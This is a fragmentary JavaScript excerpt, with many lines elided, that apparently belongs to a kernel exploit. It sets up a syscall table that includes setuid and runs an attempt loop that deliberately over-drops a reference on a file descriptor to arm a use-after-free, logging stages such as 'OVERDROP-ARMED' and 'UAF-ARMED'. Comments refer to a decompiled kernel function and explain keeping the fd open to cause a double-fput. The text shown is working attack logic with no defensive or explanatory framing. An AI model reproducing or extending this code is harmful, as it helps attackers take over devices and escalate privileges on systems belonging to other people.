...
const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
    ...
    (async function () {
     ...
     i32: M.frameDv.getUint32(0, true) | 0 };
            ...
            // ══════════════════════════════════════════════════════════════
            //  MODIFIED ATTEMPT LOOP — errno=5 from SET_QUEUE is now treated
            //  as OVERDROP-ARMED, not as a failure. The fd is left open
            //  because FUN_00964d10 already dropped a reference in its
            //  error branch; closing it would double-fput.
            // ══════════════════════════════════════════════════════════════
            ...
            for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
                ...
                mark("SET-QUEUE-1", "fd=" + dummy + " rv=" + reg1.rv
                ...
                if (reg1.rv === 0) {
                    // Happy path: registered. Trigger over-drop via second SET.
                    ...
                    // on local_40. Do NOT close the fd.
                    armed = true; via = "first-set-EIO";
                    mark("OVERDROP-ARMED", "fd=" + dummy + " via=first-set-EIO");
                } else {
                    mark("ATTEMPT-SKIP", "SET1 rv=" + reg1.rv
                    + " errno=" + reg1.err);
                    sc(SYS.close, dummy); continue;
                }

                if (!armed) { sc(SYS.close, dummy); continue; }

                uafSock = dummy;
                committed = true;
                mark("UAF-ARMED", "fd=" + uafSock + " via=" + via);
